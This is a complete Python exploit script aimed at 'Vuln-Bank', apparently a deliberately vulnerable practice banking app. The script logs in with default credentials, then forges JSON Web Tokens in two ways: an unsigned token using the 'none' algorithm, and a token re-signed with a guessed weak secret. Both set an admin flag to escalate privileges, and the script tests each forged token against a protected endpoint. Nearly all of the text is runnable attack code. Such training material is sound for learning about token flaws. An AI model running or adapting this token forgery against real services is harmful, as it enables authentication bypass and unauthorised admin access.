#!/usr/bin/env python3
"""
JWT Implementation Vulnerabilities Exploit for Vuln-Bank

This script demonstrates multiple JWT vulnerabilities in the Vuln-Bank application:
1. 'none' algorithm vulnerability
2. Weak secret key
3. Token manipulation to elevate privileges

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5000
"""

import requests
import json
import jwt
import sys
import argparse
import base64
import time

def get_valid_token(base_url, username="admin", password="admin123"):
    """
    Get a valid JWT token by logging in
    
    Args:
        base_url: The base URL of the vulnerable application
        username: Username to use for login
        password: Password to use for login
        
    Returns:
        str: JWT token if login successful, None otherwise
    """
    print(f"[*] Attempting to login as {username}...")
    
    login_url = f"{base_url}/login"
    payload = {"username": username, "password": password}
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(login_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            token = data.get('token')
            print(f"[+] Login successful! Got valid JWT token.")
            return token
        else:
            print(f"[-] Login failed. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return None
    except Exception as e:
        print(f"[-] Error during login: {str(e)}")
        return None

def decode_token(token):
    """
    Decode a JWT token without verification
    
    Args:
        token: JWT token to decode
        
    Returns:
        dict: Decoded token payload
    """
    try:
        # Decode without verification
        decoded = jwt.decode(token, options={"verify_signature": False})
        return decoded
    except Exception as e:
        print(f"[-] Error decoding token: {str(e)}")
        return None

def exploit_none_algorithm(token):
    """
    Exploit the 'none' algorithm vulnerability
    
    Args:
        token: Valid JWT token to modify
        
    Returns:
        str: Forged JWT token with 'none' algorithm
    """
    print("[*] Attempting to exploit 'none' algorithm vulnerability...")
    
    try:
        # Decode the token without verification
        decoded = decode_token(token)
        if not decoded:
            return None
            
        # Create a new token with the 'none' algorithm
        # Modify the payload to elevate privileges
        decoded['is_admin'] = True
        
        # Create a new token with the 'none' algorithm
        header = {"typ": "JWT", "alg": "none"}
        
        # Manually create the token (can't use jwt.encode as it won't allow 'none' algorithm properly)
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(decoded).encode()).decode().rstrip('=')
        
        # Create token with empty signature
        forged_token = f"{header_b64}.{payload_b64}."
        
        print("[+] Successfully created forged token with 'none' algorithm")
        print(f"[+] Original payload: {decoded}")
        return forged_token
    except Exception as e:
        print(f"[-] Error exploiting 'none' algorithm: {str(e)}")
        return None

def exploit_weak_secret(token, secret="secret123"):
    """
    Exploit the weak secret key vulnerability
    
    Args:
        token: Valid JWT token to modify
        secret: The weak secret key to use (default: "secret123")
        
    Returns:
        str: Forged JWT token with modified payload
    """
    print("[*] Attempting to exploit weak secret key vulnerability...")
    
    try:
        # Decode the token without verification
        decoded = decode_token(token)
        if not decoded:
            return None
            
        # Modify the payload to elevate privileges
        decoded['is_admin'] = True
        
        # Create a new token with the modified payload
        forged_token = jwt.encode(decoded, secret, algorithm='HS256')
        
        print("[+] Successfully created forged token with weak secret key")
        print(f"[+] Modified payload: {decoded}")
        return forged_token
    except Exception as e:
        print(f"[-] Error exploiting weak secret key: {str(e)}")
        return None

def test_token(base_url, token):
    """
    Test if a token is valid by accessing a protected endpoint
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token to test
        
    Returns:
        bool: True if token is valid, False otherwise
    """
    print("[*] Testing forged token...")
    
    # Try to access the dashboard endpoint
    dashboard_url = f"{base_url}/dashboard"
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        response = requests.get(dashboard_url, headers=headers)
        
        if response.status_code == 200:
            print("[+] Token is valid! Successfully accessed protected endpoint.")
            return True
        else:
            print(f"[-] Token is invalid. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return False
    except Exception as e:
        print(f"[-] Error testing token: {str(e)}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Exploit JWT vulnerabilities in Vuln-Bank")
    parser.add_argument("url", nargs="?", default="http://localhost:5000", 
                        help="Base URL of the vulnerable application (default: http://localhost:5000)")
    parser.add_argument("--username", default="admin", help="Username to use for login")
    parser.add_argument("--password", default="admin123", help="Password to use for login")
    parser.add_argument("--secret", default="secret123", help="Secret key to use for JWT signing")
    parser.add_argument("--token", help="Use provided JWT token instead of logging in")
    parser.add_argument("--method", choices=["none", "weak_secret", "both"], default="both",
                        help="Exploitation method to use (default: both)")
    args = parser.parse_args()
    
    print("=== Vuln-Bank JWT Vulnerabilities Exploit ===")
    print(f"[*] Target: {args.url}")
    
    # Get a valid token
    token = args.token
    if not token:
        token = get_valid_token(args.url, args.username, args.password)
        if not token:
            print("[-] Failed to get a valid token. Exiting.")
            sys.exit(1)
    
    print(f"[*] Original token: {token}")
    
    # Decode and display the token
    decoded = decode_token(token)
    if decoded:
        print(f"[*] Decoded token payload: {json.dumps(decoded, indent=2)}")
    
    # Exploit based on the selected method
    if args.method in ["none", "both"]:
        none_token = exploit_none_algorithm(token)
        if none_token:
            print(f"[+] Forged token (none algorithm): {none_token}")
            test_token(args.url, none_token)
    
    if args.method in ["weak_secret", "both"]:
        weak_secret_token = exploit_weak_secret(token, args.secret)
        if weak_secret_token:
            print(f"[+] Forged token (weak secret): {weak_secret_token}")
            test_token(args.url, weak_secret_token)
    
    print("\n[*] Exploitation complete.")

if __name__ == "__main__":
    main()
